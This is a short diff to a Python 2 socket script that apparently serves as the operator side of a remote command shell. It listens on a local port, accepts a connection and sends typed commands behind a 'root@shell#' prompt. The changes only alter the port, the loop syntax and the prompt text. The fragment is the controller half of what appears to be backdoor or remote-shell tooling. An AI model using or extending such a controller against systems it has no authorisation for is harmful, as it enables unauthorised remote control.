@@ -13,7 +13,7 @@ import sys
 import socket
 
 Host = '127.0.0.1'
-Port = 6669
+Port = 8888
 
 error = "Error : Socket\n"
 adrs = (Host, Port)
@@ -34,11 +34,11 @@ connexion, adresse = SockServ.accept()
 print "\n\a[*]New Connection ~ IP: %s, Port: %s\n" % (adresse[0], adresse[1])
 
 
-while (1):
+while True:
 
     connexion.send("cmd")
     
-    cmd = raw_input("root@db ~ # ")
+    cmd = raw_input("root@shell# ")
 
     if cmd == "/disconnect":
 
